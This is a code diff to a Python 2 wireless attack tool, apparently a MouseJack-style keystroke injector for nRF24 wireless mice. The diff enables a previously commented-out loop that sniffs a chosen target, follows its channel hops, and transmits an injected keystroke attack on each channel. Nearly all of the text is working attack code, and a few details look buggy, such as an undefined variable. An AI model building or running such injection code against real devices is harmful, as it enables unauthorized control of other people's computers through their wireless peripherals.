@@ -263,8 +263,12 @@ class mouse:
     self.radio.transmit_payload(self.serialize(self.payload), self.ack_timeout, self.retries)
 
   def send_attack(self, attack):
-    for _ in range(5):
+    for _ in range(100):
+      self.inc_sequence()
+    
+    for _ in range(3):
       self.transmit()
+      time.sleep(0.005)
 
     self.send_run()
     for c in attack:
@@ -339,7 +343,8 @@ def cli(debug, lowpower):
 
   # Channel timeout in seconds
   timeout = 0.1
-  sniff_timeout = 1.0
+  sniff_timeout = 5.0
+  channel_timeout = 0.1
 
   print G + "[+] " + W + 'Scanning...'
 
@@ -381,47 +386,61 @@ def cli(debug, lowpower):
       value = value.strip().lower()
 
       if value == "all":
-        victims = devices[:]
+        victims = pretty_devices[:]
       else:
         victims = []
         for vic in value.split(","):
           victims.append(pretty_devices[(int(vic)-1)])
-      print victims
 
-      #if len(payload) == 19 and payload[1] == 0x90:
+      targets = []
+      for victim in victims:
+        if victim[1] in devices:
+          targets.append(devices[victim[1]])
 
-       # last_ping = time.time()
-        #last_packet = time.time()
-        #scan.sniff(address)
-        #d_mouse = mouse(radio, address)
-        #d_mouse.update(payload)
+      for target in targets:
+        payload = target['payload']
+        channels = target['channels']
+        address = target['address']
 
-        #while time.time() - last_packet > sniff_timeout:
-          
+        if len(payload) != 19 or payload[1] != 0x90:
+          print R + '[-] ' + W + "Target %s is not injectable or not a mouse. Skipping..." % (scan.hexify(address))
+          continue
+
+        last_ping = time.time()
+        last_packet = time.time()
+        scan.sniff(address)
+        device = mouse(radio, address)
+        device.update(payload)
+
+        print GR + '[+] ' + W + "Waiting until channel is clear..."
+        while time.time() - last_packet > sniff_timeout:
           # Follow the target device if it changes channels
-         # if time.time() - last_ping > channel_timeout and d_mouse.pingable:
-          #  if scan.follow():
-           #   last_ping = time.time()
+          if time.time() - last_ping > channel_timeout and device.pingable:
+            if scan.follow():
+              last_ping = time.time()
 
-          # Receive payloads
-          #value = radio.receive_payload()
-          #if value[0] == 0:
-
+          # Receive payload
+          value = radio.receive_payload()
+          if value[0] == 0:
             # Reset the follow timer
-            #last_ping = time.time()
+            last_ping = time.time()
 
-            #if len(payload) == 19 and p[1] == 0x90:
+            if len(payload) == 19 and p[1] == 0x90:
               
               # Reset the packet timer
-             # last_packet = time.time()
+              last_packet = time.time()
 
               # Split the payload from the status byte
-              #payload = value[1:]
+              payload = value[1:]
 
               # Update the payload
-              #mouse_update(payload)
+              device.update(payload)
         
-        #d_mouse.send_attack(attack)
+        for channel in channels:
+          radio.set_channel(channel)
+          print GR + '[+] ' + W + 'Sending attack on channel %d' % (channel)
+          device.send_attack(attack)
+
   except KeyboardInterrupt:
     print '\n ' + R + '(^C)' + O + ' interrupted\n'
     print "[-] Quitting"
